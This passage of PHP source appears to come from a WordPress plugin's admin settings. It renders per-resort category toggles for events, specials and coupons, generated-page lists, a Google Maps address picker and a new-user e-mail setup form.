            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = $pcat['children'];
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }

}

function wtd_calendar_options($field, $value){
    global $wpdb;
    $place="calendar_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['events'];

    foreach ($options['wtd_resorts'] as $resort){
        echo '<section id="'.$place.'_'.$resort.'_first" class="resort_hide" data-place="'.$place.'">';
        foreach ($cats as $key => $pcategory){
            $category = $pcategory['parent'];
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
    }
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                if (!empty($val['children']))
                    foreach($val['children'] as $child_id => $child){
                        echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                    }
            }
        }
    }
    echo'</section>';
}
function wtd_week_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['week_pages'] as $page){
        echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
    if (!count($pages['week_pages']))
        echo '<p>The pages are generated in the background. Their links will appear here as soon as they are published!</p>';
}


function wtd_week_temp($field, $value){
    global $wpdb;
    $place="week_options";

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['events'];
    foreach ($options['wtd_resorts'] as $resort){
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $pcat){
            $cat = $pcat['parent'];
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = $pcat['children'];
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }

}

function wtd_week_options($field, $value){
    global $wpdb;
    $place="week_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['events'];

    foreach ($options['wtd_resorts'] as $resort){
        echo '<section id="'.$place.'_'.$resort.'_first" class="resort_hide" data-place="'.$place.'">';
        foreach ($cats as $key => $pcategory){
            $category = $pcategory['parent'];
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
    }
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                if (!empty($val['children']))
                    foreach($val['children'] as $child_id => $child){
                        echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                    }
            }
        }
    }
    echo'</section>';
}


function wtd_specials_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['specials_pages'] as $page){
        echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
}

function wtd_specials_temp($field, $value){
    global $wpdb;
    $place="specials_options";

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['specials'];
    foreach ($options['wtd_resorts'] as $resort){
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $pcat){
            $cat = $pcat['parent'];
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = $pcat['children'];
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }

}

function wtd_specials_options($field, $value){
    global $wpdb;
    $place="specials_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php

    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['specials'];

    foreach ($options['wtd_resorts'] as $resort){
        echo '<section id="'.$place.'_'.$resort.'_first" class="resort_hide" data-place="'.$place.'">';
        foreach ($cats as $key => $pcategory){
            $category = $pcategory['parent'];
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
    }
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                if (!empty($val['children']))
                    foreach($val['children'] as $child_id => $child){
                        echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                    }
            }
        }
    }
    echo'</section>';
}


function wtd_coupons_pages($field,$value){
    $pages = get_option('wtd_pages');
    foreach ($pages['coupons_pages'] as $page){
        echo '<a href="'.get_permalink($page).'" target="_blank" class="wtd_generated_page">'.get_the_title($page).'</a>';
    }
    if (!count($pages['coupons_pages']))
        echo '<p>The pages are generated in the background. Their links will appear here as soon as they are published!</p>';
}



function wtd_coupons_temp($field, $value){
    global $wpdb;
    $place="coupons_options";

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['coupons'];
    foreach ($options['wtd_resorts'] as $resort){
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $pcat){
            $cat = $pcat['parent'];
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = $pcat['children'];
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }

}

function wtd_coupons_options($field, $value){
    global $wpdb;
    $place="coupons_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php

    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
    foreach ($not_allowed as $n)
        $exclude[] = $n->term_id;

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['coupons'];

    foreach ($options['wtd_resorts'] as $resort){
        echo '<section id="'.$place.'_'.$resort.'_first" class="resort_hide" data-place="'.$place.'">';
        foreach ($cats as $key => $pcategory){
            $category = $pcategory['parent'];
            $icon = 'el-icon-check';
            if (!empty($options[$place][$resort][$category->term_id]['parent']))
                $icon = 'el-icon-check-empty';
            echo '<a href="javascript:void(0);" class="button wtd_cat" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><label class="term-count">'.$category->count.'</label><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
        }
        echo '</section>';
    }
    echo '<section id="'.$place.'_inputs">';
    foreach ($options['wtd_resorts'] as $resort){
        if (!empty($options[$place][$resort])){
            foreach ($options[$place][$resort] as $term_id => $val){
                if (!empty($val['parent']))
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
                if (!empty($val['children']))
                    foreach($val['children'] as $child_id => $child){
                        echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                    }
            }
        }
    }
    echo'</section>';
}

function wtd_user_map($field,$value){


    ?>
    <a href="javascript:void(0);" id="address_coder" class="button button-primary" style="margin-top:15px">Place Address on the map</a>

    <p>You can always change the marker position by dragging it into the right place.</p>

    <input type="hidden" name="wtd_plugin[user_map][lat]" id="map_user_lat" class="compiler" value="<?php echo $value['lat']; ?>" />
    <input type="hidden" name="wtd_plugin[user_map][lng]" id="map_user_lng" class="compiler" value="<?php echo $value['lng']; ?>" />
    <section id="map_canvas_user" class="wtd_map_place"></section>
    <script src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>
    <script>
        var map_user_lat = '<?php echo $value['lat'];?>';
        var map_user_lng = '<?php echo $value['lng'];?>';
        var map_user_loaded = false;
        var user_marker;
        var user_map;
        var geocoder = new google.maps.Geocoder();
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            jQuery('#map_user_lat').val(position.coords.latitude);
            jQuery('#map_user_lng').val(position.coords.longitude);
            var location = new google.maps.LatLng(position.coords.latitude, position.coords.longitude,4);
            user_map.setZoom(17);
            user_map.setCenter(location);
            user_marker.setPosition(location);
        }

        function user_map_init() {
            var map_canvas = document.getElementById('map_canvas_user');
            var map_options = {
                navigationControl: true,
                mapTypeControl: true,
                scaleControl: true,
                center: new google.maps.LatLng(map_user_lat,map_user_lng,4),
                zoom: <?php echo ($value['lng'] == '-95.677068') ? 3 : 11; ?>
            }
            user_map = new google.maps.Map(map_canvas, map_options);

            var location = new google.maps.LatLng(map_user_lat, map_user_lat);
            var animation = google.maps.Animation.DROP;
            user_marker = new google.maps.Marker({
                draggable: true,
                map: user_map,
                animation: animation,
                position: new google.maps.LatLng(map_user_lat,map_user_lng,4),
                optimized:false
            });
            google.maps.event.addListener(user_marker, 'dragend', function (event) {
                jQuery('#map_user_lat').val(this.getPosition().lat());
                jQuery('#map_user_lng').val(this.getPosition().lng());
                redux_change (jQuery('#map_user_lat'));
            });
            google.maps.event.addListenerOnce(user_map, 'idle', function(){
                map_user_loaded = true;
            });


        }
        jQuery(document).ready(function(){
            jQuery('#3_section_group_li').click(function(){
                if(!map_user_loaded){
                    user_map_init();
                }
            });
            jQuery('#geofinder_coder').click(function(event){

                event.preventDefault();
                getLocation();

            });

            jQuery('#address_coder').click(function(event){

                event.preventDefault();
                var address = '';
                if (jQuery('#address-text').val())
                    address = address + jQuery('#address-text').val();
                if (jQuery('#city-text').val())
                    address = address + ',' + jQuery('#city-text').val();
                if (jQuery('#state-text').val())
                    address = address + ',' + jQuery('#state-text').val();
                if (jQuery('#zip-text').val())
                    address = address + ' ' + jQuery('#zip-text').val();


                jQuery.ajax({
                    url: ajaxurl,
                    data:{
                        address: address,
                        action: 'wtd_geocode_address'
                    },
                    type: 'post',
                    dataType: 'json',
                    success: function(data){
                        if (data.lng && data.lat) {
                            var latlng = new google.maps.LatLng(data.lat, data.lng, 4)
                            user_map.setCenter(latlng);
                            user_map.setZoom(17);
                            user_marker.setPosition(latlng);
                            jQuery('#map_user_lat').val(data.lat);
                            jQuery('#map_user_lng').val(data.lng);
                            redux_change (jQuery('#map_user_lat'));
                        }else{
                            alert('We could not place the address on the map! Please drag the marker to the right position');
                        }
                    }
                });

            });
        });
    </script>
<?php
}


function wtd_bus_temp($field, $value){
    global $wpdb;
    $place = 'business_categories_options';
    $resort = 'user';
    $cats = $wpdb->get_results(
        'SELECT t.term_id, t.name FROM '.$wpdb->terms.' t JOIN '.$wpdb->term_taxonomy.' tt ON tt.term_id = t.term_id WHERE
                tt.taxonomy = "wtd_category"
                AND tt.parent = 0
                AND (SELECT COUNT(*) FROM '.$wpdb->term_taxonomy.' ttt WHERE ttt.parent = t.term_id) > 0
                ORDER BY t.name ASC
                '
    );
    $options = get_option('wtd_plugin');
    echo '<div class="category_full resort_hide" data-place="'.$place.'">';
    foreach ($cats as $cat){
        $cat_enable = 'selected';
        $cat_disable = '';
        if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
            $cat_enable = '';
            $cat_disable = 'selected';
        }
        ?>
        <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
            <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                <div class="switch-options">
                    <label class="cb-enable <?php echo $cat_enable;?>" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                        <span>Enable</span>
                    </label>
                    <label class="cb-disable <?php echo $cat_disable;?>" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                        <span>Disable</span>
                    </label>
                </div>
            </fieldset>
            <span>Enable/Disable "<?php echo $cat->name;?>" Category</span>
            <hr/>
            <h4>Disable individual Subcategories</h4>
            <?php
            $ch = $wpdb->get_results(
                $wpdb->prepare(
                    'SELECT t.term_id, t.name FROM '.$wpdb->terms.' t JOIN '.$wpdb->term_taxonomy.' tt ON tt.term_id = t.term_id WHERE tt.taxonomy = "wtd_category" AND tt.parent = %s ORDER BY t.name ASC',
                    $cat->term_id
                )
            );
            foreach ($ch as $c){
                $icon = 'el-icon-check';
                $class = 'button-primary';
                if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                    $icon = "el-icon-check-empty";
                    $class = '';
                }
                echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_scat button '.$class.'"><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

            }
            ?>
        </div>
    <?php
    }
    echo '</div>';

}

function wtd_bus_options($field, $value){
    global $wpdb;
    $place = 'business_categories_options';
    $resort = 'user';
    $cats = $wpdb->get_results(
        '
                SELECT t.term_id, t.name
                    FROM '.$wpdb->terms.' t
                        RIGHT JOIN '.$wpdb->term_taxonomy.' tt ON tt.term_id = t.term_id
                    WHERE
                        tt.taxonomy = "wtd_category"
                    AND tt.parent = 0
                ORDER BY
                    t.name ASC
                '
    );
    $options = get_option('wtd_plugin');

    echo '<section id="'.$place.'_'.$resort.'_first" data-place="'.$place.'">';
    foreach ($cats as $key => $category){
        $icon = 'el-icon-check';
        if (!empty($options[$place][$resort][$category->term_id]['parent']))
            $icon = 'el-icon-check-empty';
        echo '<a href="javascript:void(0);" class="button wtd_cat wtd_bus_cat" data-place="'.$place.'" data-term="'.$category->term_id.'" data-resort="'.$resort.'"><span>'.$category->name.'</span><i class="'.$icon.'"></i></a>';
    }
    echo '</section>';

    echo '<section id="'.$place.'_inputs">';
    if (!empty($options[$place][$resort])){
        foreach ($options[$place][$resort] as $term_id => $val){
            if (!empty($val['parent']))
                echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$term_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][parent]" value="1"/>';
            if (!empty($val['children']))
                foreach($val['children'] as $child_id => $child){
                    echo '<input type="hidden" id="'.$place.'_'.$resort.'_term_'.$child_id.'" name="wtd_plugin['.$place.']['.$resort.']['.$term_id.'][children]['.$child_id.']" value="1"/>';
                }
        }
    }
    echo'</section>';
}

function wtd_setup_page($field, $value){
    global $wpdb;
    wp_enqueue_media();
    add_thickbox();
    ?>
    <script src="<?php echo WTD_PLUGIN_URL.'assets/js/external/jquery.validate.min.js';?>"></script>
    <div id="info-import_feed" class="redux-normal  redux-info-field wtd_new_client wtd_setup_box">
        <i class="el-icon-asterisk icon-large"></i>
        <h2>New User</h2>
        <p>
        <form id="wtd_new_user">
            <input type="email" name="wtd_new_email" id="wtd_new_email" placeholder="Enter your E-mail Address" required/>
        </form>
        <script>
            jQuery(document).ready(function(){
                jQuery('[name="redux_save"]').val("Create User");
                jQuery('#wtd_new_email').valid();
                jQuery('#wtd_new_email').change(function(){
                    if (jQuery('#wtd_new_email').hasClass('valid')){console.log('da');}
                    setTimeout(function(){
                        if (!jQuery('#wtd_new_email').hasClass('valid')){
                            if (!jQuery('#wtd_invalid_error').length){
                                jQuery('#new_user_errors').append('<li id="wtd_invalid_error">Invalid e-mail address</li>');
                            }
                        }else{
                            jQuery('#wtd_invalid_error').remove();
                        }
                    },200);
                });
                jQuery('#wtd_new_user').click(function(event){
                    event.preventDefault();
                    var check_email = false;
                    if(jQuery('#wtd_new_email').hasClass('valid')){
                        jQuery.ajax({
                            type: 'post',
                            dataType: 'json',
                            url: ajaxurl,
                            data:{
                                action: 'wtd_check_email',
                                email: jQuery('#wtd_new_email').val()
                            },
                            success: function(data){
                                if (!data.status){
                                    if (!jQuery('#wtd_already').length)
                                        jQuery('#new_user_errors').append('<li id="wtd_already">E-mail address already registered</li>');
                                }else{
                                    jQuery('#wtd_already').remove();
                                    jQuery('#client_email-text').val(jQuery('#wtd_new_email').val());
                                    jQuery('#0_section_group').attr('style','display:none !important;');
                                    jQuery('#1_section_group').attr('style','display:block !important;');
                                    jQuery('[name="redux_save"]').attr('style','display:inline-block !important;');
                                    jQuery('.redux-container #info_bar').show();
                                }
                            }
                        });
                    }else{
                        jQuery('#wtd_already').remove();
                        jQuery('#wtd_new_email').focus();
                    }
                });
                jQuery('#resorts_wanted-select').select2({
                    allowClear: true
                });
                jQuery('.redux-field-errors').css('cursor','pointer').click(function(){
                    jQuery('#wtd_already').remove();
                    jQuery('#client_email-text').val(jQuery('#wtd_new_email').val());
                    jQuery('#0_section_group').attr('style','display:none !important;');
                    jQuery('#1_section_group').attr('style','display:block !important;');
                    jQuery('[name="redux_save"]').attr('style','display:inline-block !important;');
                    jQuery('.redux-container #info_bar').show();
                });
            });//End of Document Ready
            <?php
            global $wtd_client_error;
            $modal_text = '';
            if ($wtd_client_error):
                $modal_text = '<p><strong style="font-size:17px;"><i style="color:red;margin: 9px 9px 0px 0px;font-size:13px" class="el-icon-remove icon-large"></i>Error</strong>
         </p><ul style="list-style: square;margin-left: 10%;"><li>'.$wtd_client_error.'</li></ul>';
            ?>
            jQuery(window).load(function(){
                jQuery('#wtd_already').remove();
                jQuery('#client_email-text').val(jQuery('#wtd_new_email').val());
                jQuery('#0_section_group').attr('style','display:none !important;');
                jQuery('#1_section_group').attr('style','display:block !important;');
                jQuery('[name="redux_save"]').attr('style','display:inline-block !important;');
                jQuery('.redux-container #info_bar').show();
                tb_show("",'#TB_inline?width=307&height=100&inlineId=wtd_modal');
            });
            <?php endif; ?>
            <?php
                $wtd_reseting = get_option('wtd_reseting');
                if ($wtd_reseting){
                    $modal_text = '<img src="'.WTD_PLUGIN_URL.'/assets/img/wtd_wait.gif"/><p>Currently reseting data in the background.<br/>The page will reload as soon as the process ends</p>';
                ?>

            function wtd_check_background(){
                jQuery.ajax({
                    type: 'POST',
                    data: {
                        action: 'wtd_start_sync'
                    },
                    url : ajaxurl,
                    success:function(data){
                        window.location = "<?php echo admin_url('/admin.php?page=wtd_plugin_settings');?>";
                    }
                });
            }
            jQuery(window).load(function(){
                tb_show("",'#TB_inline?width=307&height=260&inlineId=wtd_modal');
                jQuery('.redux-action_bar input,.redux-action_bar a').hide();
                wtd_check_background();
            });
            <?php
            }

